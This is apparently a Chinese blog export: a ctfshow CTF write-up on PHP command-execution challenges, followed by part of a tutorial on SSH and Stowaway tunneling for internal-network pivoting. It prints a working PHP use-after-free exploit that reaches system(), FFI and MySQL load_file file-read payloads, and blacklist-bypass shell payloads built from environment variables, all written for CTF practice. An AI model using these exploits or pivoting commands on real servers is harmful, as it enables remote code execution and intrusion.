debug_backtrace();\n            }\n        }\n    }\n\n    class Helper {\n        public $a, $b, $c, $d;\n    }\n\n    function str2ptr(&$str, $p = 0, $s = 8) {\n        $address = 0;\n        for($j = $s-1; $j >= 0; $j--) {\n            $address <<= 8;\n            $address |= ord($str[$p+$j]);\n        }\n        return $address;\n    }\n\n    function ptr2str($ptr, $m = 8) {\n        $out = \"\";\n        for ($i=0; $i < $m; $i++) {\n            $out .= sprintf('%c',$ptr & 0xff);\n            $ptr >>= 8;\n        }\n        return $out;\n    }\n\n    function write(&$str, $p, $v, $n = 8) {\n        $i = 0;\n        for($i = 0; $i < $n; $i++) {\n            $str[$p + $i] = sprintf('%c',$v & 0xff);\n            $v >>= 8;\n        }\n    }\n\n    function leak($addr, $p = 0, $s = 8) {\n        global $abc, $helper;\n        write($abc, 0x68, $addr + $p - 0x10);\n        $leak = strlen($helper->a);\n        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }\n        return $leak;\n    }\n\n    function parse_elf($base) {\n        $e_type = leak($base, 0x10, 2);\n\n        $e_phoff = leak($base, 0x20);\n        $e_phentsize = leak($base, 0x36, 2);\n        $e_phnum = leak($base, 0x38, 2);\n\n        for($i = 0; $i < $e_phnum; $i++) {\n            $header = $base + $e_phoff + $i * $e_phentsize;\n            $p_type  = leak($header, 0, 4);\n            $p_flags = leak($header, 4, 4);\n            $p_vaddr = leak($header, 0x10);\n            $p_memsz = leak($header, 0x28);\n\n            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write\n                # handle pie\n                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;\n                $data_size = $p_memsz;\n            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec\n                $text_size = $p_memsz;\n            }\n        }\n\n        if(!$data_addr || !$text_size || !$data_size)\n            return false;\n\n        return [$data_addr, $text_size, $data_size];\n    }\n\n    function get_basic_funcs($base, $elf) {\n        list($data_addr, $text_size, $data_size) = $elf;\n        for($i = 0; $i < $data_size / 8; $i++) {\n            $leak = leak($data_addr, $i * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                # 'constant' constant check\n                if($deref != 0x746e6174736e6f63)\n                    continue;\n            } else continue;\n\n            $leak = leak($data_addr, ($i + 4) * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                # 'bin2hex' constant check\n                if($deref != 0x786568326e6962)\n                    continue;\n            } else continue;\n\n            return $data_addr + $i * 8;\n        }\n    }\n\n    function get_binary_base($binary_leak) {\n        $base = 0;\n        $start = $binary_leak & 0xfffffffffffff000;\n        for($i = 0; $i < 0x1000; $i++) {\n            $addr = $start - 0x1000 * $i;\n            $leak = leak($addr, 0, 7);\n            if($leak == 0x10102464c457f) { # ELF header\n                return $addr;\n            }\n        }\n    }\n\n    function get_system($basic_funcs) {\n        $addr = $basic_funcs;\n        do {\n            $f_entry = leak($addr);\n            $f_name = leak($f_entry, 0, 6);\n\n            if($f_name == 0x6d6574737973) { # system\n                return leak($addr + 8);\n            }\n            $addr += 0x20;\n        } while($f_entry != 0);\n        return false;\n    }\n\n    function trigger_uaf($arg) {\n        # str_shuffle prevents opcache string interning\n        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');\n        $vuln = new Vuln();\n        $vuln->a = $arg;\n    }\n\n    if(stristr(PHP_OS, 'WIN')) {\n        die('This PoC is for *nix systems only.');\n    }\n\n    $n_alloc = 10; # increase this value if UAF fails\n    $contiguous = [];\n    for($i = 0; $i < $n_alloc; $i++)\n        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');\n\n    trigger_uaf('x');\n    $abc = $backtrace[1]['args'][0];\n\n    $helper = new Helper;\n    $helper->b = function ($x) { };\n\n    if(strlen($abc) == 79 || strlen($abc) == 0) {\n        die(\"UAF failed\");\n    }\n\n    # leaks\n    $closure_handlers = str2ptr($abc, 0);\n    $php_heap = str2ptr($abc, 0x58);\n    $abc_addr = $php_heap - 0xc8;\n\n    # fake value\n    write($abc, 0x60, 2);\n    write($abc, 0x70, 6);\n\n    # fake reference\n    write($abc, 0x10, $abc_addr + 0x60);\n    write($abc, 0x18, 0xa);\n\n    $closure_obj = str2ptr($abc, 0x20);\n\n    $binary_leak = leak($closure_handlers, 8);\n    if(!($base = get_binary_base($binary_leak))) {\n        die(\"Couldn't determine binary base address\");\n    }\n\n    if(!($elf = parse_elf($base))) {\n        die(\"Couldn't parse ELF header\");\n    }\n\n    if(!($basic_funcs = get_basic_funcs($base, $elf))) {\n        die(\"Couldn't get basic_functions address\");\n    }\n\n    if(!($zif_system = get_system($basic_funcs))) {\n        die(\"Couldn't get zif_system address\");\n    }\n\n    # fake closure object\n    $fake_obj_offset = 0xd0;\n    for($i = 0; $i < 0x110; $i += 8) {\n        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));\n    }\n\n    # pwn\n    write($abc, 0x20, $abc_addr + $fake_obj_offset);\n    write($abc, 0xd0 + 0x38, 1, 4); # internal func type\n    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler\n\n    ($helper->b)($cmd);\n    exit();\n}\n```\n\n经过url编码后传进去就可以拿到flag!\n\n# web73--74\n\n73本题没有open_basedir限制，但74题是过滤了scandir()函数，所以都可以用72的伪协议去查看目录\n\n试一下这个发现可以用\n\n```\nc=var_export(scandir('/'));exit();\n```\n\n也可以用72的伪协议去查看目录\n\ninclude()函数也可以用\n\n```\nc=include(\"/flagc.txt\");exit();\n```\n\n# web75--76\n\n用伪协议查看文件目录 后发现这道题include_path限制了文件包含的路径，无法直接使用include包含得到flag信息,\n\n这里直接摘抄大佬的wp里的payload:\n\npayload:\n\n```php\ntry {\n\t# 创建 PDO 实例, 连接 MySQL 数据库\n\t$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root', 'root');\n\t\n\t# 在 MySQL 中，load_file(完整路径) 函数读取一个文件并将其内容作为字符串返回。\n\tforeach($dbh->query('select load_file(\"/flag36.txt\")') as $row) {\n\t\techo($row[0]).\"|\";\n\t}\n\t\n\t$dbh = null;\n}\n\ncatch (PDOException $e) {\n\techo $e->getMessage();exit(0);\n}\n\nexit(0);\n```\n\n采用mysql里面的\n\n### LOAD_FILE()函数\n\n**文件读取**：`LOAD_FILE()` 函数允许数据库用户读取服务器上的任意文件\n\n# web77\n\n正常使用伪协议看目录\n\n然后发现各种做法都不能做，果断看wp:\n\nc=$ffi = FFI::cdef(\"int system(const char *command);\");$a='/readflag > 1.txt';$ffi->system($a);exit();\n\n解释一下:\n\n$ffi = FFI::cdef(\"int system(const char *command);\");  //创建一个system对象\n\n$a='/readflag > 1.txt';  //因为页面不会回显，所以将内容输出到1.txt\n\n$ffi->system($a);  //通过$ffi去调用system函数 \n\n讲一下FFI\n\n### FFI原理\n\nFFI，php7.4 以上才有。\n\n**FFI**（Foreign Function Interface），即外部函数接口，是指在一种语言里调用另一种语言代码的技术。PHP 的 FFI 扩展就是一个让你在 PHP 里调用 C 代码的技术。\n\n# web118\n\n## #内置变量绕过\n\n提示flag在flag.php中\n\n![image-20250317154006777](../image/achieve/202411/命令执行--ctfshow/image-20250317154006777.png)\n\n在源码里面有一段注释掉的\n\n```\n<!-- system($code);-->\n```\n\n应该就是传参给code了\n\n测试了一下发现数字字母都禁用了，试一下无数字字母rce，然后测出来自增和异或都用不了，一开始想做取反的但是括号也禁用了，这时候又是一个新姿势就是用系统环境变量进行绕过，详细的我写在RCE的文章里了，这里就直接给payload了\n\n```\n${PATH:~A}${PWD:~A} ????.???\n```\n\n通过环境变量构造出字符nl，任何字母取反后都是数字0，然后用?号去匹配文件名flag.php\n\n# web119\n\n一样的界面，不过PATH被过滤了，试试别的环境变量\n\n这里放一位师傅的构造字符的姿势\n\n![image-20250317164620779](../image/achieve/202411/命令执行--ctfshow/image-20250317164620779.png)\n\n然后我们可以通过bash运行cat命令，那我们的payload就是\n\n```\n方法一：\n/???/?a? ????.???\npayload：\n${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?${USER:~A}? ????.???\n一开始这个payload打不出来估计是匹配不到，后面把t置换一下才可以\n${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?${USER:~A}${HOME:${#HOSTNAME}:${#SHLVL}} ????.???\n方法二：\n/???/??t ????.???\npayload\n${PWD:${#}:${#SHLVL}}???${PWD:${#}:${#SHLVL}}??${HOME:${#HOSTNAME}:${#SHLVL}} ????.???\n方法三：\n构造/bin/base64 flag.php\n/???/?????4 ????.???\n${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.???\n```\n\n![image-20250317165809692](../image/achieve/202411/命令执行--ctfshow/image-20250317165809692.png)\n\n不过我${USER:~A}的结果是t，可能当前用户是www-data吧结果输出出来就是a，但是一开始只匹配?a?不太行，最后直接构造/???/?at去精准匹配了\n\n后续：哦原来第一个payload是可以打出来的不过我没注意看有flag\n\n# web120\n\n这次是给出源码了\n\n```php\n\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\nif(isset($_POST['code'])){\n    $code=$_POST['code'];\n    if(!preg_match('/\\x09|\\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\\/|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|\\!|\\=|\\^|\\*|\\x26|\\%|\\<|\\>|\\'|\\\"|\\`|\\||\\,/', $code)){    \n        if(strlen($code)>65){\n            echo '<div align=\"center\">'.'you are so long , I dont like '.'</div>';\n        }\n        else{\n        echo '<div align=\"center\">'.system($code).'</div>';\n        }\n    }\n    else{\n     echo '<div align=\"center\">evil input</div>';\n    }\n}\n\n?>\n```\n\nHOME也被禁用了，长度也限制了但是第一个payload可以打，直接用就行\n\n![image-20250317184857147](../image/achieve/202411/命令执行--ctfshow/image-20250317184857147.png)\n\n# web121\n\n这次过滤了所有的环境变量\n\n```php\n\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\nif(isset($_POST['code'])){\n    $code=$_POST['code'];\n    if(!preg_match('/\\x09|\\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\\/|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|_|~|\\!|\\=|\\^|\\*|\\x26|\\%|\\<|\\>|\\'|\\\"|\\`|\\||\\,/', $code)){    \n        if(strlen($code)>65){\n            echo '<div align=\"center\">'.'you are so long , I dont like '.'</div>';\n        }\n        else{\n        echo '<div align=\"center\">'.system($code).'</div>';\n        }\n    }\n    else{\n     echo '<div align=\"center\">evil input</div>';\n    }\n}\n\n?>\n```\n\n先输出可用字符\n\n```\n# $ . : ; ? @ A B C D E F G H I J K L M N O P Q R S T U V W X Y Z { } \n```\n\n虽然过滤了SHLVL，但是可用用其他的表示1，那就可以用上面的base64的\n\n```\n构造/bin/base64 flag.php\n/???/?????4 ????.???\n${PWD::${##}}???${PWD::${##}}?????${#RANDOM} ????.???\n```\n\n根据上面的图片去替换就可以，再次感谢那位师傅的图\n\n![image-20250317190451957](../image/achieve/202411/命令执行--ctfshow/image-20250317190451957-1742209493627-7.png)\n\n不过RANDOM是随机出现整数，范围为0-32767。然后加上#号表示的是这个变量的值的长度，例如`${#1234}`的结果就是4\n\n# web122\n\n这次连PWD和#都过滤了\n\n```php\n\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\nif(isset($_POST['code'])){\n    $code=$_POST['code'];\n    if(!preg_match('/\\x09|\\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\\/|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|_|~|\\!|\\=|\\^|\\*|\\x26|#|%|\\>|\\'|\\\"|\\`|\\||\\,/', $code)){    \n        if(strlen($code)>65){\n            echo '<div align=\"center\">'.'you are so long , I dont like '.'</div>';\n        }\n        else{\n        echo '<div align=\"center\">'.system($code).'</div>';\n        }\n    }\n    else{\n     echo '<div align=\"center\">evil input</div>';\n    }\n}\n\n?>\n```\n\n 还是需要构造的\n\n看了其他的环境变量发现HOME还没被过滤，用来返回当前用户的主目录路径。不管怎么样第一个都是`/`，那就可以拿第三个payload去打\n\n```\n/???/???4 ????.???\n```\n\n然后我们只需要解决一个如何构造数字的问题。我们需要数字`1`和`4`。\n\n我们可以利用`$?`，获取上一条命令执行结束后的返回值，`0`代表成功，`非0`代表失败。\n\n```\nroot@dkhkv28T7ijUp1amAVjh:/# echo ${HOME:~~A}\n/root\nroot@dkhkv28T7ijUp1amAVjh:/# echo $?\n0\nroot@dkhkv28T7ijUp1amAVjh:/# lss\nCommand 'lss' not found, but there are 15 similar ones.\nroot@dkhkv28T7ijUp1amAVjh:/# echo $?\n127\n```\n\n但是这里并不是1，该怎么做呢\n\n错误代码的非0返回值如下\n\n```\n\"OS error code   1:  Operation not permitted\"\n\"OS error code   2:  No such file or directory\"\n\"OS error code   3:  No such process\"\n\"OS error code   4:  Interrupted system call\"\n\"OS error code   5:  Input/output error\"\n\"OS error code   6:  No such device or address\"\n\"OS error code   7:  Argument list too long\"\n\"OS error code   8:  Exec format error\"\n\"OS error code   9:  Bad file descriptor\"\n\"OS error code  10:  No child processes\"\n\"OS error code  11:  Resource temporarily unavailable\"\n\"OS error code  12:  Cannot allocate memory\"\n\"OS error code  13:  Permission denied\"\n\"OS error code  14:  Bad address\"\n\"OS error code  15:  Block device required\"\n\"OS error code  16:  Device or resource busy\"\n\"OS error code  17:  File exists\"\n\"OS error code  18:  Invalid cross-device link\"\n\"OS error code  19:  No such device\"\n\"OS error code  20:  Not a directory\"\n\"OS error code  21:  Is a directory\"\n\"OS error code  22:  Invalid argument\"\n\"OS error code  23:  Too many open files in system\"\n\"OS error code  24:  Too many open files\"\n\"OS error code  25:  Inappropriate ioctl for device\"\n\"OS error code  26:  Text file busy\"\n\"OS error code  27:  File too large\"\n\"OS error code  28:  No space left on device\"\n\"OS error code  29:  Illegal seek\"\n\"OS error code  30:  Read-only file system\"\n\"OS error code  31:  Too many links\"\n\"OS error code  32:  Broken pipe\"\n\"OS error code  33:  Numerical argument out of domain\"\n\"OS error code  34:  Numerical result out of range\"\n\"OS error code  35:  Resource deadlock avoided\"\n\"OS error code  36:  File name too long\"\n\"OS error code  37:  No locks available\"\n\"OS error code  38:  Function not implemented\"\n\"OS error code  39:  Directory not empty\"\n\"OS error code  40:  Too many levels of symbolic links\"\n\"OS error code  42:  No message of desired type\"\n\"OS error code  43:  Identifier removed\"\n\"OS error code  44:  Channel number out of range\"\n\"OS error code  45:  Level 2 not synchronized\"\n\"OS error code  46:  Level 3 halted\"\n\"OS error code  47:  Level 3 reset\"\n\"OS error code  48:  Link number out of range\"\n\"OS error code  49:  Protocol driver not attached\"\n\"OS error code  50:  No CSI structure available\"\n\"OS error code  51:  Level 2 halted\"\n\"OS error code  52:  Invalid exchange\"\n\"OS error code  53:  Invalid request descriptor\"\n\"OS error code  54:  Exchange full\"\n\"OS error code  55:  No anode\"\n\"OS error code  56:  Invalid request code\"\n\"OS error code  57:  Invalid slot\"\n\"OS error code  59:  Bad font file format\"\n\"OS error code  60:  Device not a stream\"\n\"OS error code  61:  No data available\"\n\"OS error code  62:  Timer expired\"\n\"OS error code  63:  Out of streams resources\"\n\"OS error code  64:  Machine is not on the network\"\n\"OS error code  65:  Package not installed\"\n\"OS error code  66:  Object is remote\"\n\"OS error code  67:  Link has been severed\"\n\"OS error code  68:  Advertise error\"\n\"OS error code  69:  Srmount error\"\n\"OS error code  70:  Communication error on send\"\n\"OS error code  71:  Protocol error\"\n\"OS error code  72:  Multihop attempted\"\n\"OS error code  73:  RFS specific error\"\n\"OS error code  74:  Bad message\"\n\"OS error code  75:  Value too large for defined data type\"\n\"OS error code  76:  Name not unique on network\"\n\"OS error code  77:  File descriptor in bad state\"\n\"OS error code  78:  Remote address changed\"\n\"OS error code  79:  Can not access a needed shared library\"\n\"OS error code  80:  Accessing a corrupted shared library\"\n\"OS error code  81:  .lib section in a.out corrupted\"\n\"OS error code  82:  Attempting to link in too many shared libraries\"\n\"OS error code  83:  Cannot exec a shared library directly\"\n\"OS error code  84:  Invalid or incomplete multibyte or wide character\"\n\"OS error code  85:  Interrupted system call should be restarted\"\n\"OS error code  86:  Streams pipe error\"\n\"OS error code  87:  Too many users\"\n\"OS error code  88:  Socket operation on non-socket\"\n\"OS error code  89:  Destination address required\"\n\"OS error code  90:  Message too long\"\n\"OS error code  91:  Protocol wrong type for socket\"\n\"OS error code  92:  Protocol not available\"\n\"OS error code  93:  Protocol not supported\"\n\"OS error code  94:  Socket type not supported\"\n\"OS error code  95:  Operation not supported\"\n\"OS error code  96:  Protocol family not supported\"\n\"OS error code  97:  Address family not supported by protocol\"\n\"OS error code  98:  Address already in use\"\n\"OS error code  99:  Cannot assign requested address\"\n\"OS error code 100:  Network is down\"\n\"OS error code 101:  Network is unreachable\"\n\"OS error code 102:  Network dropped connection on reset\"\n\"OS error code 103:  Software caused connection abort\"\n\"OS error code 104:  Connection reset by peer\"\n\"OS error code 105:  No buffer space available\"\n\"OS error code 106:  Transport endpoint is already connected\"\n\"OS error code 107:  Transport endpoint is not connected\"\n\"OS error code 108:  Cannot send after transport endpoint shutdown\"\n\"OS error code 109:  Too many references: cannot splice\"\n\"OS error code 110:  Connection timed out\"\n\"OS error code 111:  Connection refused\"\n\"OS error code 112:  Host is down\"\n\"OS error code 113:  No route to host\"\n\"OS error code 114:  Operation already in progress\"\n\"OS error code 115:  Operation now in progress\"\n\"OS error code 116:  Stale NFS file handle\"\n\"OS error code 117:  Structure needs cleaning\"\n\"OS error code 118:  Not a XENIX named type file\"\n\"OS error code 119:  No XENIX semaphores available\"\n\"OS error code 120:  Is a named type file\"\n\"OS error code 121:  Remote I/O error\"\n\"OS error code 122:  Disk quota exceeded\"\n\"OS error code 123:  No medium found\"\n\"OS error code 124:  Wrong medium type\"\n\"OS error code 125:  Operation canceled\"\n\"OS error code 126:  Required key not available\"\n\"OS error code 127:  Key has expired\"\n\"OS error code 128:  Key has been revoked\"\n\"OS error code 129:  Key was rejected by service\"\n\"OS error code 130:  Owner died\"\n\"OS error code 131:  State not recoverable\"\n\"MySQL error code 132: Old database file\"\n\"MySQL error code 133: No record read before update\"\n\"MySQL error code 134: Record was already deleted (or record file crashed)\"\n\"MySQL error code 135: No more room in record file\"\n\"MySQL error code 136: No more room in index file\"\n\"MySQL error code 137: No more records (read after end of file)\"\n\"MySQL error code 138: Unsupported extension used for table\"\n\"MySQL error code 139: Too big row\"\n\"MySQL error code 140: Wrong create options\"\n\"MySQL error code 141: Duplicate unique key or constraint on write or update\"\n\"MySQL error code 142: Unknown character set used\"\n\"MySQL error code 143: Conflicting table definitions in sub-tables of MERGE table\"\n\"MySQL error code 144: Table is crashed and last repair failed\"\n\"MySQL error code 145: Table was marked as crashed and should be repaired\"\n\"MySQL error code 146: Lock timed out; Retry transaction\"\n\"MySQL error code 147: Lock table is full;  Restart program with a larger locktable\"\n\"MySQL error code 148: Updates are not allowed under a read only transactions\"\n\"MySQL error code 149: Lock deadlock; Retry transaction\"\n\"MySQL error code 150: Foreign key constraint is incorrectly formed\"\n\"MySQL error code 151: Cannot add a child row\"\n\"MySQL error code 152: Cannot delete a parent row\"\n```\n\n我们关注能返回1的命令就行，其实就是权限问题，但是很多权限的命令都是有字母的，然后看到了一个<A是可以返回1的\n\n```\npayload：（${Z}代表0）\n\ncode=<A;${HOME::$?}???${HOME::$?}?????${RANDOM::$?} ????.???\n\ncode=<A;${HOME:${Z}:$?}???${HOME:${Z}:$?}?????${RANDOM::$?} ????.???\n```\n\n这里的话也是有概率的，需要多次刷新\n\n# web124\n\n```php\n<?php\nerror_reporting(0);\n//听说你很喜欢数学，不知道你是否爱它胜过爱flag\nif(!isset($_GET['c'])){\n    show_source(__FILE__);\n}else{\n    //例子 c=20-1\n    $content = $_GET['c'];\n    if (strlen($content) >= 80) {\n        die(\"太长了不会算\");\n    }\n    $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]'];\n    foreach ($blacklist as $blackitem) {\n        if (preg_match('/' . $blackitem . '/m', $content)) {\n            die(\"请不要输入奇奇怪怪的字符\");\n        }\n    }\n    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp\n    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];\n    preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs);  \n    foreach ($used_funcs[0] as $func) {\n        if (!in_array($func, $whitelist)) {\n            die(\"请不要输入奇奇怪怪的函数\");\n        }\n    }\n    //帮你算出答案\n    eval('echo '.$content.';');\n}\n```\n\n","tags":["命令执行"],"categories":["ctfshow"]},{"title":"内网代理的搭建学习","url":"/2025/03/13/内网代理的搭建学习/","content":"\n# 0x01废话\n\n之前在打春秋云镜的靶场的时候接触过一点内网穿透，当时也学着搭了一下隧道，不过还是得认真学习一下。\n\n参考文章:\n\n[图文总结：正向代理与反向代理 ](https://www.cnblogs.com/wzh2010/p/18031168)\n\n[内网代理搭建](https://fushuling.com/index.php/2023/09/21/内网代理搭建/)\n\n加上参考了N1的内网渗透体系建设的书\n\n# 0x02前置知识\n\n在渗透测试的过程中，通常我们打进外网getshell之后，就需要对内网进行渗透，此时除了需要对内网进行基础的信息收集之外，还需要通过端口转发或搭建代理等方式去完成与内网之间的通道搭建\n\n 在学习端口转发和隧道搭建之前，我们需要理清楚两个知识点\n\n## 正向代理和反向代理\n\n其实正向代理和反向代理都位于客户端和真实服务器之间的，都是为了将客户端发送的请求转发给服务器，然后再将服务器的响应返回给客户端\n\n正向代理的作用是什么呢？\n\n- 正向代理可以隐藏客户端的真实IP地址，代理服务器代表客户端去向服务器发起请求。根据一定的规则限制或允许客户端的访问请求，实现访问控制功能。\n- 在某些地区或网络环境下，用户可能无法直接访问某些网站或服务。那么我们可以通过设置正向代理来突破这些限制，实现访问。\n\n反向代理的作用是什么呢？\n\n- 反向代理可以隐藏后端服务器的真实地址和端口，防止直接攻击（如DoS/DDoS）。同时，还可以实现SSL加密、访问控制等安全功能。\n- 反向代理可以根据后端服务器的负载情况，将请求分发到不同的服务器上，实现负载均衡，提高系统的整体性能。(CDN的实现)\n\n这两个的区别是什么？\n\n- **代理对象**不同，正向代理是为客户端提供代理服务的，旨在保护客户端的隐私安全；而反向代理是为服务器提供代理服务的，旨在保护服务器的隐私安全。\n- 服务对象：在正向代理中，服务器不知道真正的用户是谁；而在反向代理中，用户不知道真正的服务器是谁。说白了就是正向代理将客户端的请求发送给服务器的时候，会隐藏客户端的真实IP地址，而反向代理在返回服务器的响应的时候会隐藏服务器的真实IP地址。\n- **用途和目的：** 正向代理的主要用途是为在防火墙内的局域网客户端提供访问Internet的途径，侧重于解决访问限制问题。而反向代理的主要用途是将防火墙后面的服务器提供给Internet用户访问，其目的在于实现负载均衡、安全防护等。\n\n## 正向连接和反向连接\n\n什么是正向连接？\n\n- 正向连接(攻击机去连接靶机)就是受控制端主机监听一个端口，然后由控制端主机主动去连接受控端主机的过程，适用于**受控主机具有公网IP**的情况。\n\n什么是反向连接？\n\n- 反向连接(靶机主动连接攻击机)就是控制端主句监听一个端口，由受控端主机反向去连接控制端主机的过程，适用于受控端没有公网IP的情况，但是同时也是需要**受控端可以出网**才能实现的。\n\n但是在我们正常的渗透中，正向连接往往都会受到受控主机上的防火墙限制或者权限不足的情况所困扰，这时候反向连接可以更好的完成两个机子之间的连接\n\n前置知识了解完了，我们开始学习如何进行代理搭建\n\n# 0x03端口转发\n\n端口转发(Port Forwarding)是网络地址转换(NAT)的一种应用。通过端口转发，我们可以将一个网络端口上收到的数据转发到另一个网络端口，转发的端口可以是本机的端口也可以是其他主机上的端口。\n\n**端口转发实现的作用是什么呢？**假如内网部署的安全机制例如防火墙会检查某个敏感端口的连接情况，会对数据的传入起到一个阻断作用，这时候我们可以通过端口转发将这个敏感端口的数据转发到另一个不会被防火墙检测的端口上，以此建立起一个通信隧道，这样就可以绕过防火墙的检测并与指定的端口实现通信，所以搭建代理的过程又被称为是搭建隧道的过程。\n\n另外我们讲到端口转发，就不得不提到一个端口映射，之前我一直以为所谓将数据转发的过程叫做端口映射，后来仔细百度了才知道这两者是不一样的。\n\n## 端口映射\n\n端口映射：也是一种网络地址转换的应用，不过它是用于把公网的地址翻译成私有地址。端口映射可以将外网主机收到的请求映射到内网主机上，使得没有公网IP地址的内网主机能够对外提供相应的服务\n\n看到一个师傅给的例子我觉得挺形象的，就是比如我们在内网中有一台Web服务器，但是其他网域中的用户是没有办法直接访问该服务器。所以在路由器上设置一个端口映射，只要q用户访问路由器ip的80端口，那么路由器会把自动把流量转到内网Web服务器的80端口上。并且，在路由器上还存在一个Session，当内网服务器返回数据给路由器时，路由器能准确的将消息发送给外网请求用户的主机。在这过程中，路由器充当了一个反向代理的作用，他保护了内网中主机的安全。\n\n其实这两个应用本质上都是为了访问内网服务器上无法访问到的服务，只不过是操作的方法不一样\n\n# 0x04内网代理搭建\n\n## 搭建ssh隧道\n\n### 单层的ssh隧道搭建\n\n例如我们在内网渗透的时候已经拿到了一台位于某个内网中的服务器的shell，那我们可以利用这个服务器作为跳板使得我们可以访问该内网内的其他服务器然后展开我们的渗透\n\n环境拓扑如下，我这里借一下师傅的图\n\n![image-20250314143137263](../image/achieve/202411/内网代理的搭建/image-20250314143137263.png)\n\n此时我们想要搭建ssh隧道使得我们可以访问办公网的web服务器\n\n- **本地端口转发**--流量从SSH客户端主机转发到 SSH 服务器主机，然后转发到目标机器端口。\n\n在Windows攻击机命令行运行:\n\n```\nssh -L 8085:172.2.136.5:80 ctfshow@pwn.challenge.ctf.show -p 28227\n```\n\n参数`-L`：将目标端口代理在本机的端口上\n\n这里的话就是将内网主机的80端口的流量转发到主机的8085端口上，然后通过访问localhost:8085去访问内网主机的服务，具体的实现过程是这样的：\n\n- 先通过SSH协议连接到可控服务器的28227端口上，此时可控服务器就作为跳板或代理服务器\n- 配置本地端口转发，此时所有发往本地 `8085` 端口的请求，会通过SSH加密隧道转发到代理服务器，再由代理服务器转发到内网主机 `172.2.136.5` 的80端口。\n- 端口转发流程：我们访问本地的8085端口的时候，SSH将请求先发送到代理服务器的28227端口，并由代理服务器将请求发送到内网主机的80端口，请求的响应数据原路返回，通过加密隧道传回本地8085端口\n\nSSH搭建隧道的应用场景：\n\n- 访问内网服务：当内网目标主机无法直接通过公网访问服务的时候，我们就可以通过搭建SSH隧道进行内网穿透，打破限制\n- 安全加密传输：所有流量通过SSH加密，防止中间人攻击导致数据泄露\n\n除了本地端口转发，还有远程端口转发\n\n- **远程端口转发**--其实大差不差，不过是用的我们自己的远程服务器进行端口转发的\n\n```\nssh - R 8085:[Remote IP]:172.2.136.5:80 ctfshow@pwn.challenge.ctf.show -p 28227\n```\n\n### 多层的SSH隧道搭建\n\n多层的话就要进行多层端口的转发了\n\n环境拓扑：\n\n![image-20250314151850375](../image/achieve/202411/内网代理的搭建/image-20250314151850375.png)\n\n有两个可控的服务器，一个位于表层一个位于深层，假如表层内网有服务器的话隧道搭建和上面的单层是一样的，但是这里我们需要访问的内网web服务器位于深层内网，这时候就需要进行多层隧道的搭建了\n\n首先我们先在表层内网服务器上运行\n\n```\nssh -L 8085:172.2.136.5:80 ctfshow@pwn.challenge.ctf.show -p 28227\n```\n\n在表层内网和深层内网之间建立隧道，使得我们可以通过访问表层内网服务器的8085端口去访问内网web服务的80端口，然后我们在Windows上运行\n\n```\nssh -L 8086:127.0.0.1:8085 root@vps_ip -p vps_port\n```\n\n在攻击机和表层内网之间建立隧道，使得我们可以通过访问8086端口去访问表层内网服务器的8085端口\n\n然后我们就可以通过在本地访问8086直接访问深层内网中的172.2.136.5的web服务\n\n## 利用Stowaway搭建隧道\n\n![image-20250309230505042](../image/achieve/202411/内网代理的搭建/image-20250309230505042.png)\n\n![image-20250309231411403](../image/achieve/202411/内网代理的搭建/image-20250309231411403.png)\n\n这个工具很好用，命令也比较简单，可以分正反向代理去搭建代理\n\n在这些参数里面我们只需要关注`-l`，`-s`，`-c`这三个参数，其中`-l`，`-c`这两个参数的使用取决于是正向连接还是反向连接，主动连接的一方就是采用主动模式的参数`-c`\n\n搭建正向代理，就让攻击机去连接靶机。\n\n先在靶机上监听端口(我用的Linux云服务器)\n\n```\n.\\windows_x64_agent.exe -l 9999\n```\n\n然后在自己的攻击机上进行正向代理的连接\n\n```\n.\\windows_x64_admin.exe -c 